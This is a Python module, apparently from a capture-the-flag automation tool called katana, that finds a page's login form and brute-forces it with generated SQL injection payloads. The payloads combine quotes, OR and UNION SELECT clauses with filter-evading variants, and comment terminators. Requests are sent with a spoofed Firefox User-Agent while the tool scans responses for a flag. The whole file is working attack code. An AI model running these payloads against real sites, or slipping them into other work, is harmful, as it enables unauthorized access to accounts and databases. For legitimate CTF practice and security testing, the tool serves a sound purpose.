"""
Basic SQL Injection 

This will attempt basic SQL injection of the form ' OR 1=1 # 
with varying quotes, comment techniques, and nested SQL clauses.
It passes a User-Agent to act as a regular Firefox web browser.
"""


import requests
import re
from typing import Any

from katana.unit import NotApplicable
from katana.units import web


class Unit(web.WebUnit):
    PRIORITY = 25

    def __init__(self, *args, **kwargs):

        # Run the parent constructor, to ensure this is a valid URL
        super(Unit, self).__init__(*args, **kwargs)

        self.action = re.findall(
            rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        self.method = re.findall(
            rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )

        self.username = re.findall(
            web.user_regex, self.target.content, flags=re.IGNORECASE
        )
        self.password = re.findall(
            web.pass_regex, self.target.content, flags=re.IGNORECASE
        )

        # Sometimes, a form might not have an explicit location. Assume the current page!
        if self.action == []:
            self.action = [b"#"]

        # Only run this if we have potential information...
        if not (self.action and self.method and self.username and self.password):
            raise NotApplicable("no form found")

    def enumerate(self):

        # This should "yield 'name', (params,to,pass,to,evaluate)"
        # evaluate will see this second argument as only one variable and you will need to parse them out
        if self.action and self.method and self.username and self.password:
            if self.action:
                action = self.action[0].decode("utf-8")
            if self.method:
                method = self.method[0].decode("utf-8")
            if self.username:
                username = self.username[0].decode("utf-8")
            if self.password:
                password = self.password[0].decode("utf-8")

            try:
                method = vars(requests)[method.lower()]
            except IndexError:
                # Could not find a valid method... default to POST
                method = requests.post

            quotes_possibilities = ["'", '"']
            comment_possibilities = ["--", "#", "/*", "%00"]
            delimeter_possibilities = [" ", "/**/"]
            test_possibilities = [
                "OR",
                "OORR",
                "UNION SELECT",
                "UNUNIONION SELSELECTECT",
            ]

            payloads = []
            count_attempt = 0
            for quote in quotes_possibilities:
                for comment in comment_possibilities:
                    for delimeter in delimeter_possibilities:
                        for test in test_possibilities:
                            payload = (
                                quote
                                + delimeter
                                + test.replace(" ", delimeter)
                                + delimeter
                                + "1"
                                + delimeter
                                + comment
                            )
                            count_attempt += 1
                            yield (method, action, username, password, payload)

        else:
            return  # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.

    def evaluate(self, case: Any):

        # Split up the target (see get_cases)
        method, action, username, password, payload = case

        # Grab the URL pieces
        url_form = self.target.upstream.decode("utf-8").split("/")

        # if this is a relative path, get the furthermost directory location
        if len(url_form) > 3:
            last_location = "/".join(url_form[:-1]) + "/"
        else:
            last_location = self.target.upstream.decode("utf-8").rstrip("/") + "/"

        # Now send the payload with a regular user browser
        try:
            r = method(
                last_location + action,
                data={username: payload, password: payload},
                timeout=2,
                headers={"User-Agent": web.firefox_browser_user_agent},
            )
        except (
            requests.exceptions.ConnectionError,
            requests.exceptions.ChunkedEncodingError,
        ):
            # We can't reach the site... stop trying this unit!
            return

        # Hunt for flags. If we found one, stop all other requests!
        hit = self.manager.find_flag(self, r.text)

        # If we found a flag, stop trying SQL injection!!
        if hit:
            return

        # You should ONLY return what is "interesting"
        # Since we cannot gauge the results of this payload versus the others,
        # we will only care if we found the flag.
        return None
